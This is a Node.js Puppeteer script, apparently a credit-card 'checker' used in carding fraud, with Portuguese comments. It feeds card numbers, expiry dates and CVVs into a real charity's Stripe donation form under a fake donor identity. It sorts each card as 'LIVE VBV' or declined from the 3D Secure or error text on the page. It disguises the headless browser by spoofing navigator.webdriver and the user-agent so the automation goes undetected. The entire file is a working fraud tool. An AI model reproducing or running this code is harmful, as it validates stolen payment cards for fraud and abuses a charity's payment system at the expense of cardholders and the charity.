// checker.js - VERSÃO FINAL (DETECTA AUTORIZAÇÃO + VALIDAÇÃO DE SEGURANÇA)
const puppeteer = require('puppeteer');
const fs = require('fs');
const path = require('path');

const URL = 'https://www.rarediseasesinternational.org/donate/';

const LIVE_PHRASES = [
    'Autorização de Compra', 'para concluir a transação', 'Validação de Segurança',
    'Authentication', 'Verify', 'Complete', 'Authenticate', 'Para maior segurança',
    'Challenge', 'Additional authentication', 'Confirm your identity', '3D Secure',
    'Secure Checkout'
];

const DEAD_TEXTS = [
    'Compra não concluída', 'Não foi possível concluir a transação', 'Indisponibilidade temporária',
    'Your card was declined', 'Card declined', 'Transaction failed', 'Payment failed',
    'Unable to process', 'Insufficient funds', 'Invalid card', 'Card not supported',
    'Processing error', 'Transaction not approved', 'Declined by bank'
];

const LOADING_TEXTS = [
    'Processing', 'Please wait', 'Loading', 'Aguarde', 'Processando',
    'Verifying', 'Submitting', 'Please do not close', 'Do not refresh', 'Redirecting'
];

let LOGS = [];

function log(msg) {
    const time = new Date().toLocaleTimeString();
    const line = `[${time}] ${msg}`;
    LOGS.push(line);
    console.log(line);
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function getStripeFrame(page, inputSelector) {
    for (let attempt = 0; attempt < 12; attempt++) {
        for (const frame of page.frames()) {
            if (!frame.url().includes('stripe.com')) continue;
            try {
                const el = await frame.$(inputSelector);
                if (!el) continue;
                const visible = await frame.evaluate(element => {
                    const rect = element.getBoundingClientRect();
                    return rect.width > 0 && rect.height > 0;
                }, el);
                if (visible) return { frame, el };
            } catch (e) { }
        }
        await sleep(200);
    }
    return null;
}

async function typeInStripeField(page, inputSelector, value) {
    const result = await getStripeFrame(page, inputSelector);
    if (!result) return false;
    const { frame, el } = result;
    try {
        await el.evaluate(e => e.scrollIntoView({ block: 'center' }));
        await sleep(80);
        await el.click({ clickCount: 3 });
        await sleep(80);
        await page.keyboard.press('Backspace');
        await sleep(80);
        await el.type(value, { delay: 25 });
        await sleep(150);
        await page.keyboard.press('Tab');
        await sleep(200);
        return true;
    } catch (e) {
        return false;
    }
}

async function fillDonationForm(page) {
    try {
        await page.waitForSelector('button[value="10,00"]', { visible: true, timeout: 8000 });
        await page.click('button[value="10,00"]');
    } catch (e) { }
    const fields = [
        ['#give-first', 'MAIA'],
        ['#give-last', 'SAMMY'],
        ['#give-email', 'hebertharts@gmail.com']
    ];
    for (const [sel, val] of fields) {
        try {
            await page.waitForSelector(sel, { visible: true, timeout: 3000 });
            await page.click(sel, { clickCount: 3 });
            await page.type(sel, val, { delay: 10 });
            await sleep(30);
        } catch (e) { }
    }
    await sleep(100);
}

async function fillCardFields(page, card) {
    await sleep(1500);
    await typeInStripeField(
        page,
        'input[name="cardnumber"], input[data-elements-stable-field-name="cardNumber"], input[autocomplete="cc-number"]',
        card.pan
    );
    await sleep(300);
    const expDate = `${card.mes}${card.ano.slice(-2)}`;
    await typeInStripeField(
        page,
        'input[name="exp-date"], input[data-elements-stable-field-name="cardExpiry"], input[autocomplete="cc-exp"]',
        expDate
    );
    await sleep(300);
    const cvcOk = await typeInStripeField(
        page,
        'input[name="cvc"], input[data-elements-stable-field-name="cardCvc"], input[autocomplete="cc-csc"]',
        card.cvv
    );
    if (!cvcOk) {
        for (const frame of page.frames()) {
            if (!frame.url().includes('stripe.com')) continue;
            const cvcInput = await frame.$('input[name="cvc"], input[data-elements-stable-field-name="cardCvc"]');
            if (cvcInput) {
                await cvcInput.click({ clickCount: 3 });
                await page.keyboard.press('Backspace');
                await cvcInput.type(card.cvv, { delay: 40 });
                break;
            }
        }
    }
    await sleep(200);
    try {
        const nameSelector = '#give-card-name-field-13101-1, input[name="card_name"], input[id*="card-name"]';
        await page.waitForSelector(nameSelector, { visible: true, timeout: 3000 });
        await page.click(nameSelector, { clickCount: 3 });
        await page.type(nameSelector, 'MAIA SAMMY', { delay: 15 });
    } catch (e) { }
}

async function safeEvaluate(page, fn, def = null) {
    try { return await page.evaluate(fn); } catch { return def; }
}

async function getCurrentUrl(page) {
    try { return page.url(); } catch { return null; }
}

async function isStillLoading(page) {
    const text = await safeEvaluate(page, () => document.body.innerText, '');
    for (const t of LOADING_TEXTS) if (text.includes(t)) return true;
    return await safeEvaluate(page, () => {
        const els = document.querySelectorAll('[class*="spinner"], [class*="loading"], [class*="loader"]');
        for (const el of els) if (el.offsetHeight > 0) return true;
        return false;
    }, false);
}

async function checkTextInFrames(page, texts) {
    const main = await safeEvaluate(page, () => document.body.innerText, '');
    for (const t of texts) if (main.includes(t)) return t;
    for (const frame of page.frames()) {
        try {
            const ft = await frame.evaluate(() => document.body?.innerText || '');
            for (const t of texts) if (ft.includes(t)) return t;
        } catch {}
    }
    return null;
}

// ========== EXTRAIR TEXTO DO 3DS (AUTORIZAÇÃO OU VALIDAÇÃO SMS) ==========
async function extract3DSText(page) {
    // Tentar em todos os frames
    for (const frame of page.frames()) {
        try {
            const text = await frame.evaluate(() => {
                // TIPO 1: Autorização de Compra (challengeInfoText)
                const div1 = document.querySelector('.challengeInfoText');
                if (div1) {
                    let text = div1.innerText || div1.textContent || '';
                    text = text.trim();
                    if (text.length > 0) {
                        const idx = text.indexOf('Estabelecimento:');
                        if (idx !== -1) text = text.substring(0, idx).trim();
                        return { type: 'autorizacao', text: text };
                    }
                }
                
                // TIPO 2: Validação de Segurança SMS (info_message_auth)
                const div2 = document.querySelector('#info_message_auth');
                if (div2) {
                    let text = div2.innerText || div2.textContent || '';
                    text = text.trim();
                    if (text.length > 0) return { type: 'validacao_sms', text: text };
                }
                
                // TIPO 3: processingZone
                const section = document.querySelector('#processingZone');
                if (section) {
                    let text = section.innerText || section.textContent || '';
                    text = text.trim();
                    const idx = text.indexOf('Estabelecimento:');
                    if (idx !== -1) text = text.substring(0, idx).trim();
                    if (text.length > 0) return { type: 'processamento', text: text };
                }
                
                return null;
            });
            
            if (text && text.text && text.text.length > 0) {
                return text;
            }
        } catch (e) {}
    }
    
    // Tentar na página principal
    try {
        const text = await page.evaluate(() => {
            // TIPO 1: Autorização de Compra
            const div1 = document.querySelector('.challengeInfoText');
            if (div1) {
                let text = div1.innerText || div1.textContent || '';
                text = text.trim();
                if (text.length > 0) {
                    const idx = text.indexOf('Estabelecimento:');
                    if (idx !== -1) text = text.substring(0, idx).trim();
                    return { type: 'autorizacao', text: text };
                }
            }
            
            // TIPO 2: Validação de Segurança SMS
            const div2 = document.querySelector('#info_message_auth');
            if (div2) {
                let text = div2.innerText || div2.textContent || '';
                text = text.trim();
                if (text.length > 0) return { type: 'validacao_sms', text: text };
            }
            
            // TIPO 3: processingZone
            const section = document.querySelector('#processingZone');
            if (section) {
                let text = section.innerText || section.textContent || '';
                text = text.trim();
                const idx = text.indexOf('Estabelecimento:');
                if (idx !== -1) text = text.substring(0, idx).trim();
                if (text.length > 0) return { type: 'processamento', text: text };
            }
            
            return null;
        });
        
        if (text && text.text && text.text.length > 0) {
            return text;
        }
    } catch (e) {}
    
    return null;
}

async function detect3DS(page) {
    log('🔍 Monitorando 3DS...');
    const start = Date.now();
    const MAX = 25000;

    return new Promise(resolve => {
        const check = async () => {
            const elapsed = Date.now() - start;
            const url = await getCurrentUrl(page);

            if (elapsed > MAX) {
                resolve({ status: 'live_3ds', trigger: 'timeout_3ds', details: null });
                return;
            }

            if (url && url.includes('/donation-confirmation/')) {
                resolve({ status: 'dead', trigger: 'donation_confirmation', details: null });
                return;
            }

            if (elapsed >= 2000) {
                const live = await checkTextInFrames(page, LIVE_PHRASES);
                if (live) {
                    log(`✅ LIVE! "${live}"`);
                    await sleep(500);
                    const details = await extract3DSText(page);
                    if (details) {
                        log(`📋 TIPO: ${details.type}`);
                        log('📋 DETALHES:');
                        log(details.text);
                    }
                    resolve({ status: 'live_3ds', trigger: live, details: details });
                    return;
                }
                const loading = await isStillLoading(page);
                if (!loading) {
                    const dead = await checkTextInFrames(page, DEAD_TEXTS);
                    if (dead) {
                        log(`❌ DEAD: "${dead}"`);
                        resolve({ status: 'dead', trigger: dead, details: null });
                        return;
                    }
                }
            }

            setTimeout(check, 200);
        };
        check();
    });
}

async function waitForInitialResponse(page) {
    const start = Date.now();
    const MAX = 10000;
    return new Promise(resolve => {
        const check = async () => {
            const elapsed = Date.now() - start;
            const url = await getCurrentUrl(page);

            if (elapsed > MAX) { resolve({ status: 'timeout' }); return; }

            if (url && url.includes('/donation-confirmation/')) {
                log('❌ /donation-confirmation/');
                resolve({ status: 'dead', trigger: 'donation_confirmation' });
                return;
            }
            if (url && url.includes('hooks.stripe.com')) {
                log('✅ hooks.stripe.com = 3DS!');
                resolve({ status: 'redirected_stripe' });
                return;
            }

            const errorMsg = await safeEvaluate(page, () => {
                const els = document.querySelectorAll('.give-errors, .give_error');
                for (const el of els) {
                    if (el.offsetHeight > 0 && el.innerText.trim().length > 0)
                        return el.innerText.trim();
                }
                return null;
            }, null);

            if (errorMsg) {
                resolve({ status: 'dead', trigger: errorMsg.substring(0, 50) });
                return;
            }

            setTimeout(check, 300);
        };
        check();
    });
}

async function clickDonateAndDetect(page) {
    try {
        await page.waitForSelector('#give-purchase-button', { visible: true, timeout: 8000 });
        await page.click('#give-purchase-button');
        log('✅ Donate Now clicado');
    } catch {
        return { status: 'dead', trigger: 'no_button' };
    }

    const initial = await waitForInitialResponse(page);
    if (initial.status === 'dead') return initial;
    if (initial.status === 'redirected_stripe') return await detect3DS(page);
    return { status: 'dead', trigger: initial.trigger || 'no_response' };
}

async function checkCard(cardString, resultFile) {
    LOGS = [];
    log(`🚀 ${cardString}`);
    
    const [pan, mes, ano, cvv] = cardString.split('|');
    const card = {
        pan: pan.trim(),
        mes: mes.trim().padStart(2, '0'),
        ano: ano.trim(),
        cvv: cvv.trim()
    };

    const browser = await puppeteer.launch({
        headless: "new",
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--disable-features=IsolateOrigins,site-per-process',
            '--window-size=1366,768',
            '--disable-blink-features=AutomationControlled',
            '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ],
        defaultViewport: { width: 1366, height: 768 },
        ignoreDefaultArgs: ['--enable-automation']
    });

    try {
        const page = await browser.newPage();
        
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
        });
        
        await page.setRequestInterception(true);
        page.on('request', req => {
            if (['image', 'media', 'font'].includes(req.resourceType())) req.abort();
            else req.continue();
        });

        log('🌐 Carregando página...');
        await page.goto(URL, { waitUntil: 'domcontentloaded', timeout: 25000 });
        await sleep(1000);
        try { await page.click('#onetrust-accept-btn-handler', { timeout: 1500 }); } catch {}

        await fillDonationForm(page);
        await fillCardFields(page, card);

        const result = await clickDonateAndDetect(page);
        
        log(`🏁 ${result.status} | ${result.trigger}`);

        let finalResult;
        if (result.status.startsWith('live')) {
            let message = '✅ LIVE - ' + result.trigger;
            
            if (result.details && result.details.text) {
                // Formatar mensagem baseado no tipo
                if (result.details.type === 'validacao_sms') {
                    message = '✅ LIVE VBV\n📱 VALIDAÇÃO DE SEGURANÇA (SMS)\n📋 ' + result.details.text;
                } else {
                    message = '✅ LIVE VBV\n📋 ' + result.details.text;
                }
            } else {
                message = '✅ LIVE VBV\n📋 ' + result.trigger;
            }
            
            finalResult = { status: 'LIVE VBV', message: message, log: LOGS.join('\n') };
        } else {
            finalResult = { status: 'RECUSADA', message: '❌ DEAD - ' + result.trigger, log: LOGS.join('\n') };
        }

        fs.writeFileSync(resultFile, JSON.stringify(finalResult, null, 2));
        const logFile = resultFile.replace('.json', '_log.txt');
        fs.writeFileSync(logFile, LOGS.join('\n'));
        
        console.log('RESULTADO:' + JSON.stringify({ status: finalResult.status, message: finalResult.message }));

        await page.close().catch(() => {});
    } catch (err) {
        log(`💥 ERRO: ${err.message}`);
        const finalResult = { status: 'RECUSADA', message: '❌ Erro: ' + err.message, log: LOGS.join('\n') };
        fs.writeFileSync(resultFile, JSON.stringify(finalResult, null, 2));
        console.log('RESULTADO:' + JSON.stringify({ status: finalResult.status, message: finalResult.message }));
    } finally {
        await browser.close().catch(() => {});
    }
}

const cardArg = process.argv[2];
const resultFile = process.argv[3];

if (cardArg && resultFile && cardArg.includes('|')) {
    const dir = path.dirname(resultFile);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    
    checkCard(cardArg, resultFile).then(() => process.exit(0)).catch(err => {
        fs.writeFileSync(resultFile, JSON.stringify({ status: 'RECUSADA', message: 'Erro: ' + err.message }));
        process.exit(1);
    });
} else {
    console.log('RESULTADO:' + JSON.stringify({ status: 'RECUSADA', message: 'Argumentos inválidos' }));
    process.exit(1);
}